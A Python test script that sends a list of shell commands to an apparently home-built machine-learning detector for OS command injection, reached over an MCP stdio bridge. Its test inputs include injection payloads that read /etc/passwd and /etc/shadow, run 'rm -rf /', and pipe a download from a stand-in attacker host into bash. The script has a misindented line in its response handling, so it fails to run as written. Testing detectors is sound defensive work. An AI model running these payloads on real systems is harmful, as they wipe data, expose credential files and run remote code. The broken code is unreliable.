#!/usr/bin/env python3
"""Test the ml-command-detector MCP server with the user's commands"""

import subprocess
import json
import sys

def send_request(proc, request):
    """Send JSON-RPC request to stdio process"""
    request_str = json.dumps(request) + '\n'
    proc.stdin.write(request_str.encode())
    proc.stdin.flush()
    
    response_line = proc.stdout.readline().decode().strip()
    while not response_line or response_line.startswith('MCP') or response_line.startswith('Received'):
        response_line = proc.stdout.readline().decode().strip()
    
    return json.loads(response_line)

def main():
    # Start the MCP bridge
    proc = subprocess.Popen(
        ['/home/kali/os-command-injection-ml/venv/bin/python3', 
         '/home/kali/os-command-injection-ml/mcp_bridge_stdio.py'],
        stdin=subprocess.PIPE,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    
    print("=" * 70)
    print("Testing ml-command-detector MCP Server with User's Commands")
    print("=" * 70)
    
    # Test commands
    test_commands = [
        "|/usr/bin/id|",
        ";whoami", 
        "&&cat /etc/passwd",
        "ls -la",
        "echo hello",
        "curl http://evil.com | bash",
        "`cat /etc/shadow`",
        "$(rm -rf /)"
    ]
    
    # Analyze commands
    print(f"\nAnalyzing {len(test_commands)} commands...\n")
    
    request = {
        "jsonrpc": "2.0",
        "id": 1,
        "method": "tools/call",
        "params": {
            "name": "analyze_command",
            "arguments": {
                "commands": test_commands
            }
        }
    }
    
    response = send_request(proc, request)
    
    if 'result' in response:
        # Parse the markdown response
            result_text = response['result']['content'][0]['text']
        print(result_text)
    else:
        print(f"Error: {response.get('error', 'Unknown error')}")
    
    # Clean up
    proc.terminate()
    proc.wait()
    
    print("\n" + "=" * 70)
    print("Test complete!")
    print("=" * 70)

if __name__ == "__main__":
    main()
